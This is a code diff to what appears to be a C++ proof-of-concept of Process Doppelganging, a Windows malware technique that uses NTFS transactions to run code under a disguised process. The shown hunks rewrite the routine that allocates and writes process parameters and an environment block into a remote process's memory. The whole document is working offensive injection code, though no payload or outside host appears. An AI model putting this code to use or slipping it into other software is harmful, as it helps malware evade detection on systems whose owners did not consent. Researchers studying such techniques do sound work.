@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <KtmW32.h>
+#include <userenv.h>
 
 #include <iostream>
 #include <stdio.h>
@@ -12,6 +13,7 @@
 
 #pragma comment(lib, "KtmW32.lib")
 #pragma comment(lib, "Ntdll.lib")
+#pragma comment(lib, "Userenv.lib")
 
 #define PAGE_SIZE 0x1000
 
@@ -58,19 +60,60 @@ bool buffer_remote_peb(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, OUT PEB &
     return true;
 }
 
-LPVOID write_params_into_process(HANDLE hProcess, PVOID buffer, SIZE_T buffer_size, DWORD protect)
+//Preserve the aligmnent! The remote address of the parameters must be the same as local.
+LPVOID write_params_into_process(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS params, DWORD protect)
 {
-    //Preserve the aligmnent! The remote address of the parameters must be the same as local.
-    LPVOID remote_params = VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (remote_params == nullptr) {
-        std::cerr << "RemoteProcessParams failed" << std::endl;
+    if (params == NULL) return NULL;
+
+    PVOID buffer = params;
+    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;
+
+    //params and environment in one space:
+    if (params->Environment) {
+        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
+            buffer = (PVOID)params->Environment;
+        }
+        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
+        if (env_end > buffer_end) {
+            buffer_end = env_end;
+        }
+    }
+    // copy the continuous area containing parameters + environment
+    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
+    if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+        if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
+            std::cerr << "Writing RemoteProcessParams failed" << std::endl;
+            return nullptr;
+        }
+        if (params->Environment) {
+            if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
+                std::cerr << "Writing environment failed" << std::endl;
+                return nullptr;
+            }
+        }
+        return (LPVOID)params;
+    }
+
+    // could not copy the continuous space, try to fill it as separate chunks:
+    if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+        std::cerr << "Allocating RemoteProcessParams failed" << std::endl;
         return nullptr;
     }
-    if (!WriteProcessMemory(hProcess, buffer, buffer, buffer_size, NULL)) {
-        std::cerr << "RemoteProcessParams failed" << std::endl;
+    if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
+        std::cerr << "Writing RemoteProcessParams failed" << std::endl;
         return nullptr;
     }
-    return buffer;
+    if (params->Environment) {
+        if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+            std::cerr << "Allocating environment failed" << std::endl;
+            return nullptr;
+        }
+        if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
+            std::cerr << "Writing environment failed" << std::endl;
+            return nullptr;
+        }
+    }
+    return (LPVOID)params;
 }
 
 bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LPWSTR targetPath)
@@ -92,6 +135,9 @@ bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LP
     wchar_t *windowName = L"Process Doppelganging test!";
     RtlInitUnicodeString(&uWindowName, windowName);
 
+    LPVOID environment;
+    CreateEnvironmentBlock(&environment, NULL, TRUE);
+
     PRTL_USER_PROCESS_PARAMETERS params  = nullptr;
     NTSTATUS status = RtlCreateProcessParametersEx(
         &params,
@@ -99,7 +145,7 @@ bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LP
         (PUNICODE_STRING) &uDllDir,
         (PUNICODE_STRING) &uCurrentDir,
         (PUNICODE_STRING) &uTargetPath,
-        nullptr,
+        environment,
         (PUNICODE_STRING) &uWindowName,
         nullptr,
         nullptr,
@@ -110,7 +156,7 @@ bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LP
         std::cerr << "RtlCreateProcessParametersEx failed" << std::endl;
         return false;
     }
-    LPVOID remote_params = write_params_into_process(hProcess, params, params->Length, PAGE_READWRITE);
+    LPVOID remote_params = write_params_into_process(hProcess, params, PAGE_READWRITE);
     if (!remote_params) {
         std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
         return false;
